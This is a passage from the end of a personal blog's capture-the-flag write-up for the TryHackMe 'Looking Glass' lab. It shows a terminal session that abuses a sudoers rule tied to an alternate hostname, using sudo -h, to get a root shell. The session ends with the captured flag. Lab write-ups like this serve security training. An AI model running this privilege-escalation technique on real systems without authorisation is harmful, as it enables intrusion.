</pre><td class="rouge-code"><pre>alice@looking-glass:/etc/sudoers.d<span class="nv">$ </span><span class="nb">cat </span>alice
alice ssalg-gnikool <span class="o">=</span> <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/bash
alice@looking-glass:/etc/sudoers.d<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-h</span> ssalg-gnikool <span class="nt">-l</span>
<span class="nb">sudo</span>: unable to resolve host ssalg-gnikool
Matching Defaults entries <span class="k">for </span>alice on ssalg-gnikool:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User alice may run the following commands on ssalg-gnikool:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/bash
alice@looking-glass:/etc/sudoers.d<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-h</span> ssalg-gnikool /bin/bash
<span class="nb">sudo</span>: unable to resolve host ssalg-gnikool
root@looking-glass:/etc/sudoers.d# 
</pre></table></code></div></div><ul><li><p>We’ve got root!</p><li><p><code class="language-plaintext highlighter-rouge">thm{bc2337b6f97d057b01da718ced6ead3f}</code></p></ul><h1 id="final-words">Final Words:</h1><ul><li>Another pretty interesting and hard box. Really challenge your PrivEsc and Enumeration skill!</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/write-up/'>Write Up</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/write-up/" class="post-tag no-text-decoration" >write-up</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/looking-glass/" class="post-tag no-text-decoration" >looking-glass</a> <a href="/tags/thm/" class="post-tag no-text-decoration" >thm</a> <a href="/tags/wonderland/" class="post-tag no-text-decoration" >wonderland</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=[TryHackMe] Looking Glass - Tri Nguyen&url=/posts/TryHackMe-LookingGlass/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=[TryHackMe] Looking Glass - Tri Nguyen&u=/posts/TryHackMe-LookingGlass/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=[TryHackMe] Looking Glass - Tri Nguyen&url=/posts/TryHackMe-LookingGlass/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Hydra-Cheatsheet/">[Knowledge] Hydra Cheatsheet</a><li><a href="/posts/TryHackMe-Road/">[TryHackMe] Road</a><li><a href="/posts/EZCTF-2022/">[EZCTF] Report</a><li><a href="/posts/Announcement/">[Announcement] I promise I will upload write-ups!</a><li><a href="/posts/OverTheWire-Leviathan/">[OverTheWire] [Leviathan] Report</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/write-up/">write-up</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/ejpt/">ejpt</a> <a class="post-tag" href="/tags/ine/">ine</a> <a class="post-tag" href="/tags/knowledge/">knowledge</a> <a class="post-tag" href="/tags/tool/">tool</a> <a class="post-tag" href="/tags/redteam/">redteam</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/TryHackMe-Wonderland/"><div class="card-body"> <span class="timeago small" >Nov 21, 2021<i class="unloaded">2021-11-21T17:00:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>[TryHackMe] Wonderland</h3><div class="text-muted small"><p> IP: 10.10.143.221 Enumeration Gobuster Nothing special… ┌──(kali㉿kali)-[~/Desktop/thm/wonderland] └─$ gobuster dir --url 10.10.143.221 -w /opt/seclists/Discovery/Web-Content/common.txt ...</p></div></div></a></div><div class="card"> <a href="/posts/TryHackMe-Road/"><div class="card-body"> <span class="timeago small" >Nov 30, 2021<i class="unloaded">2021-11-30T20:40:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>[TryHackMe] Road</h3><div class="text-muted small"><p> Enumeration nmap Port 80 and 22 open gobuster No stand out dirs. OWASP ZAP Path traversal detected but I think this is false positive. Manual enumeration: ...</p></div></div></a></div><div class="card"> <a href="/posts/TryHackMe-AgentSudo/"><div class="card-body"> <span class="timeago small" >Nov 20, 2021<i class="unloaded">2021-11-20T17:00:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>[TryHackMe] AgentSudo</h3><div class="text-muted small"><p> IP: http://10.10.239.92/ Task 2: Enumerate How many open ports? nmap scan ┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo] └─# nmap -sS -sV -p- 10.10.239.92 | tee nmap.txt Starting Nmap...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/TryHackMe-Wonderland/" class="btn btn-outline-primary" prompt="Older"><p>[TryHackMe] Wonderland</p></a> <a href="/posts/TryHackMe-Road/" class="btn btn-outline-primary" prompt="Newer"><p>[TryHackMe] Road</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/letri6tdn">Tri Nguyen (Nguyễn Lê Trí)</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/write-up/">write up</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/ejpt/">ejpt</a> <a class="post-tag" href="/tags/ine/">ine</a> <a class="post-tag" href="/tags/knowledge/">knowledge</a> <a class="post-tag" href="/tags/tool/">tool</a> <a class="post-tag" href="/tags/redteam/">redteam</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
